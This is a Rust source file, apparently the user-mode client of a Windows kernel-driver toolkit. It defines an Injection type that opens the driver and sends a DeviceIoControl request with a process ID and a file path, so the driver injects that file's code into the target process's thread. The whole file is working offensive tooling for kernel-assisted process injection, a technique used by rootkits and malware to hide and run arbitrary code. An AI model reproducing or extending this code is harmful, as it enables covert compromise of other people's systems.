use crate::{utils::check_file, utils::open_driver};
use common::structs::TargetInjection;
use std::{ffi::c_void, ptr::null_mut};
use windows_sys::Win32::{
    Foundation::{CloseHandle, HANDLE},
    System::IO::DeviceIoControl,
};

/// Provides operations for injecting code into processes through a driver interface.
pub struct Injection {
    driver_handle: HANDLE,
}

impl Injection {
    /// Creates a new `Injection` instance, opening a handle to the driver.
    ///
    /// # Returns
    ///
    /// * An instance of `Injection`.
    ///
    /// # Panics
    ///
    /// Panics if the driver cannot be opened.
    pub fn new() -> Self {
        let driver_handle = open_driver().expect("Error");
        Injection { driver_handle }
    }

    /// Injects code into a process's thread specified by `pid` using a file at `path`.
    ///
    /// # Arguments
    ///
    /// * `ioctl_code` - The IOCTL code for the thread injection operation.
    /// * `pid` - A reference to the PID of the target process.
    /// * `path` - The file path of the code to inject.
    pub fn injection(self, ioctl_code: u32, pid: &u32, path: &String) {
        log::info!("Starting process injection for PID: {pid}, using file: {path}");

        log::info!("Checking if the file exists at the specified path");
        if !check_file(path) {
            log::error!("File not found at the specified path: {path}. Please check the file path and try again");
            return;
        }

        log::info!("File found!!!");
        log::debug!("Preparing injection structure");
        let mut info_injection = TargetInjection {
            path: path.to_string(),
            pid: *pid as usize,
        };

        log::debug!("Sending DeviceIoControl command to Process Injection");
        let mut return_buffer = 0;
        let status = unsafe {
            DeviceIoControl(
                self.driver_handle,
                ioctl_code,
                &mut info_injection as *mut _ as *mut c_void,
                size_of::<TargetInjection>() as u32,
                null_mut(),
                0,
                &mut return_buffer,
                null_mut(),
            )
        };

        if status == 0 {
            log::error!("DeviceIoControl Failed with status: 0x{:08X}", status);
        } else {
            log::info!("Process injection was successfully performed on PID: {pid} using the file at path: {path}");
        }
    }
}

impl Drop for Injection {
    /// Ensures the driver handle is closed when `Injection` goes out of scope.
    fn drop(&mut self) {
        log::debug!("Closing the driver handle");
        unsafe { CloseHandle(self.driver_handle) };
    }
}
